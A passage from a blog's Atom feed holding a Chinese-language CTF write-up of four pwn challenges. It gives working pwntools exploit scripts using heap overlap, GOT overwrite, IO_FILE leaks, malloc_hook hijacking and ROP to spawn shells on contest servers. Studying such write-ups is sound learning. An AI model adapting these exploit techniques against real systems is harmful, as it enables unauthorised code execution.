wZaY78W1UAzyhlJng05ouUGf0Q== </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>iofile利用</title>
    <link href="https://nocbtm.github.io/2020/04/15/iofile%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2020/04/15/iofile利用/</id>
    <published>2020-04-15T06:35:24.000Z</published>
    <updated>2020-05-27T09:24:01.000Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>高校战“疫”网络安全分享赛 pwn 复现</title>
    <link href="https://nocbtm.github.io/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-pwn-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://nocbtm.github.io/2020/03/09/高校战“疫”网络安全分享赛-pwn-复现/</id>
    <published>2020-03-09T06:59:08.000Z</published>
    <updated>2020-03-10T07:09:53.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><p>程序没开PIE，got表可写</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>ptr[v1]清零了，但*(void **)ptr[v1]没有清零。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int sub_4009E4()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  if ( ++dword_6020AC &gt; 4 )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  puts(&quot;What is the index of the item to be deleted?&quot;);</span><br><span class="line">  v1 = sub_400890();</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 6 || !ptr[v1] )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  free(*(void **)ptr[v1]);</span><br><span class="line">  free(ptr[v1]);</span><br><span class="line">  ptr[v1] = 0LL;</span><br><span class="line">  return puts(&quot;Delete successfully.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先申请俩次堆块都是0x10，然后free掉，看到add函数里是先进行malloc(0x10)，然后在做check，然后再申请check(0x400)，所以由于free之后会残留指针，在free掉俩个堆块之后，故意输入大数字让他check size fail直接返回，然后申请一个0x10的堆块就可以实现堆块重叠。通过edit前俩次的堆块来覆盖最后一次malloc的堆块的ptr指针来指向chunk_list的位置，然后伪造chunk结构指向got，并且show一下就可以知道libc了，然后修改free_got为system然后free一个内容为/bin/sh的堆块就可以开启shell。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">io=process(&apos;./easyheap&apos;)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">io=remote(&apos;121.36.209.145&apos;,9997)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&apos;./easyheap&apos;)</span><br><span class="line"></span><br><span class="line">def choice(idx):</span><br><span class="line">    io.sendlineafter(&apos;Your choice:\n&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    choice(1)</span><br><span class="line">    io.sendafter(&apos;this message?\n&apos;, str(size))</span><br><span class="line">    if size&lt; 0x400:</span><br><span class="line">    io.sendafter(&apos;content of the message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">choice(2)</span><br><span class="line">io.sendlineafter(&apos;deleted?\n&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx, content):</span><br><span class="line">    choice(3)</span><br><span class="line">    io.sendlineafter(&apos;modified?\n&apos;,str(idx))</span><br><span class="line">    io.sendafter(&apos;message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line"># ------------------------------------------------</span><br><span class="line">onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line">chunk_list=0x6020C0</span><br><span class="line"># ------------------------------------------------</span><br><span class="line">add(0x18,0x18 * &quot;\x10&quot;) #0</span><br><span class="line">add(0x18,0x18 * &quot;\x11&quot;) #1</span><br><span class="line">dele(0)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line"></span><br><span class="line">add(0x18,0x18 * &apos;\x12&apos;) #2</span><br><span class="line">edit(1,p64(0) + p64(0x18) + p64(chunk_list))</span><br><span class="line">edit(2,p64(chunk_list + 8) + p64(chunk_list))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(chunk_list) + p64(chunk_list + 0x18) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;__libc_start_main&apos;]) + p64(chunk_list + 0x30) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;free&apos;]))</span><br><span class="line"></span><br><span class="line">edit(2,p64(elf.plt[&apos;puts&apos;]))</span><br><span class="line">dele(4)</span><br><span class="line">__libc_start_main = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc = __libc_start_main - lib.symbols[b&apos;__libc_start_main&apos;]</span><br><span class="line">lib.address = libc</span><br><span class="line">system = lib.symbols[&apos;system&apos;]</span><br><span class="line">binsh = lib.search(&quot;/bin/sh\x00&quot;).next()</span><br><span class="line">__dele_hook = lib.symbols[&apos;__free_hook&apos;]</span><br><span class="line">__malloc_hook = lib.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">__realloc_hook = lib.symbols[&apos;__realloc_hook&apos;]</span><br><span class="line"></span><br><span class="line">edit(5,p64(system))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(binsh))</span><br><span class="line">dele(0)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="woodenbox2"><a href="#woodenbox2" class="headerlink" title="woodenbox2"></a>woodenbox2</h2><p>got表可写，其余保护全开</p><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>change_item()函数里面没有对size做限制，堆溢出。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>题目难点在于没有输出功能，需要打io_file泄露libc基址。然后fastbin attack 打malloc_hook,这里onegadget失效，用realloc 调整偏移即可。<br>iofile泄露原理可参考EX师傅博客<a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>成功率 16分之一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    try:</span><br><span class="line">        if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">        io=process(&apos;./woodenbox2&apos;)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">        else:</span><br><span class="line">        io=remote(&apos;121.36.215.224&apos;,9998)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">        elf=ELF(&apos;./woodenbox2&apos;)</span><br><span class="line"></span><br><span class="line">        def choice(idx):</span><br><span class="line">            io.sendlineafter(&apos;Your choice:&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        def add(size, content):</span><br><span class="line">            choice(1)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;, str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        def free(idx):</span><br><span class="line">        choice(3)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">        def edit(idx,size, content):</span><br><span class="line">            choice(2)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line">        iofile_off = [0x25dd,0xf5eb] #_IO_2_1_stderr_+157</span><br><span class="line">        onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line"></span><br><span class="line">        add(0x20,&apos;aaaa&apos;)#0</span><br><span class="line">        add(0x40,&apos;aaaa&apos;)#1</span><br><span class="line">        add(0x60,&apos;aaaa&apos;)#2</span><br><span class="line">        add(0xa0,&apos;aaaa&apos;)#3</span><br><span class="line"></span><br><span class="line">        edit(0,0x40,&apos;a&apos;*0x20+p64(0)+p64(0xc1))</span><br><span class="line">        free(1) #1</span><br><span class="line">        free(1) #2</span><br><span class="line">        add(0x40,&apos;bbbb&apos;) #0</span><br><span class="line">        edit(0,0x60,&apos;a&apos;*0x40+p64(0)+p64(0x71)+p16(iofile_off[0]))</span><br><span class="line">        add(0x60,&apos;aaaa&apos;) # 2</span><br><span class="line">        add(0x60,&apos;aaa&apos;+p64(0)*6+p64(0xfbad1800)+p64(0)*3+&quot;\x00&quot;) #3</span><br><span class="line">        io.recv(0x40)</span><br><span class="line">        leak=u64(io.recv(8))</span><br><span class="line">        info(hex(leak))</span><br><span class="line">        libc.address = leak-(0x7f35bc64a600-0x7f35bc285000)</span><br><span class="line">        log.success(hex(libc.address))</span><br><span class="line">        malloc_hook = libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line">        free_hook = libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">        one = libc.address+onegadgets[1]</span><br><span class="line">        log.success(hex(malloc_hook))</span><br><span class="line"></span><br><span class="line">        add(0x60,&apos;cccc&apos;)#4</span><br><span class="line">        add(0x60,&apos;dddd&apos;)#5</span><br><span class="line">        free(5)</span><br><span class="line">        edit(0,0x100,0xa0*&apos;\x17&apos;+p64(0)+p64(0x71)+p64(malloc_hook-0x23))</span><br><span class="line">        add(0x60,&apos;bbbb&apos;)</span><br><span class="line">        add(0x60,&apos;d&apos;*0xb+p64(one)+p64(libc.symbols[&quot;realloc&quot;]+13))</span><br><span class="line">        choice(1)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;, str(60))</span><br><span class="line">        io.interactive()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure></p><h2 id="bjut"><a href="#bjut" class="headerlink" title="bjut"></a>bjut</h2><p>got表可写，pie没开</p><h3 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>show 和 edit功能，可以输入负数，造成数组上溢。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;The index of your hw:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &lt;= 15 &amp;&amp; qword_404140[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Input your hw:&quot;);</span><br><span class="line">    read(0, qword_404140[v1], dword_4040E0[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;out of range!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>通过数组上溢泄露free_got内容，然后修改 free_got为system，然后释放/bin/sh的堆块</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h2 id="musl"><a href="#musl" class="headerlink" title="musl"></a>musl</h2><p>做这个题的时候当时是蒙的，使用的是musl libc跟平时的glibc有很大差异。其中最大的差异是muls不支持延迟绑定，没有 malloc_hook等<br>具体参考 <a href="https://my.oschina.net/u/2306127/blog/1592004" target="_blank" rel="noopener">https://my.oschina.net/u/2306127/blog/1592004</a></p><h3 id="漏洞点-3"><a href="#漏洞点-3" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>add功能有一次堆溢出的机会</p><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>溢出修改size然后free造成overlapping<br>free时检查了in_use和下一个chunk的prev_size，提前伪造好prev_size<br>overlapping后再取出来，可以uaf，free chunk的链表头部在libc，uaf之后show泄露libc地址，然后edit把fd和bk改为0x602030，利用双向链表写fd bk的操作把一个堆地址写入0x602040，将heap_store劫持到堆上，实现任意地址读写<br>show和edit的次数有限制，但是可以通过任意地址读写覆盖计数器<br>got plt都不可写，没有hook<br>可以通过任意地址读写改写栈，getshell<br>利用任意地址读，读libc中的environ泄露栈地址，算出栈顶地址，然后利用任意地址写覆盖返回地址</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">r=process([&apos;./libc.so&apos;,&apos;./carbon&apos;])</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line">else:</span><br><span class="line">r=remote(&apos;119.3.158.103&apos;,19008)</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;wdnmd&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def gg_add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;Y\x00&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;2&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;3&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line">    sleep(0.5)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;4&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">heap_store = 0x602030</span><br><span class="line">#add-symbol-file libc.so 0x8000000</span><br><span class="line">#x/64gx 0x82953b0</span><br><span class="line">#x/20gx 0x00007fffff7e0000</span><br><span class="line">add(0x10,&apos;gg&apos;)#0</span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x50,p64(0)*6+p64(0x81)+p64(0xa1))#2</span><br><span class="line">add(0x40,&apos;gg&apos;)#3</span><br><span class="line">add(0x20,&apos;gg&apos;)#4</span><br><span class="line">add(0x20,p64(0x40)+p64(heap_store))#5</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">gg_add(0x10,&apos;a&apos;*0x10+p64(0x21)+p64(0x81))#0</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x30,&apos;gg&apos;)#2 6</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">show(6)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">info(hex(leak))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">libc_base = leak-0x292ad8</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">system = libc_base+libc.sym[&apos;system&apos;]</span><br><span class="line">edit(6,p64(heap_store)*2)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">add(0x30,p64(heap_store))#pwn</span><br><span class="line">environ = libc_base+0x294FD8</span><br><span class="line">log.success(hex(environ))</span><br><span class="line"></span><br><span class="line">add(0x60,p64(0x71)+p64(environ)+p64(0x71)+p64(libc_base+0x8295570-0x8000000))# environ 9 </span><br><span class="line">edit(5,p64(0))</span><br><span class="line">show(9)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">stack_rsp = leak-0x118</span><br><span class="line">log.success(hex(stack_rsp))</span><br><span class="line">#gg_stack = 0x7ffffffee638</span><br><span class="line">#print(hex(gg_stack-stack_rsp))</span><br><span class="line">gg_stack = 0xa0+stack_rsp</span><br><span class="line">binsh = libc.search(&apos;/bin/sh\x00&apos;).next()+libc_base</span><br><span class="line">edit(10,p64(0x71)+p64(gg_stack)+&apos;/bin/sh&apos;.ljust(8,&apos;\x00&apos;)+p64(0)+p64(0x41)+p64(binsh))</span><br><span class="line">edit(5,p64(0))</span><br><span class="line">#show(12) test libc_addr</span><br><span class="line">pause()</span><br><span class="line">menu = 0x400c2f</span><br><span class="line">flag = libc_base+0x8295580-0x8000000</span><br><span class="line">pop_rdi_ret = libc_base+0x14862</span><br><span class="line">pop_rsi_ret = libc_base+0x1c237</span><br><span class="line">pop_rdx_ret = libc_base+0x1b92</span><br><span class="line"></span><br><span class="line">puts_addr = libc_base+libc.sym[&apos;puts&apos;]</span><br><span class="line">#edit(10,p64(menu)*10)</span><br><span class="line">edit(10,p64(menu)+p64(pop_rdi_ret)+p64(flag)+p64(system)+p64(menu))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;easyheap&quot;&gt;&lt;a href=&quot;#easyheap&quot; class=&quot;headerlink&quot; title=&quot;easyheap&quot;&gt;&lt;/a&gt;easyheap&lt;/h2&gt;&lt;p&gt;程序没开PIE，got表可写&lt;/p&gt;
&lt;h3 id=&quot;漏洞点&quot;&gt;&lt;a href=&quot;#漏洞点&quot;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>V&amp;N招新赛writeup</title>
    <link href="https://nocbtm.github.io/2020/03/02/V&amp;N%E6%8B%9B%E6%96%B0%E8%B5%9Bwriteup/"/>
    <id>https://nocbtm.github.io/2020/03/02/V&amp;N招新赛writeup/</id>
    <published>2020-03-02T08:47:00.000Z</published>
    <updated>2020-04-23T04:00:50.000Z</updated>
    
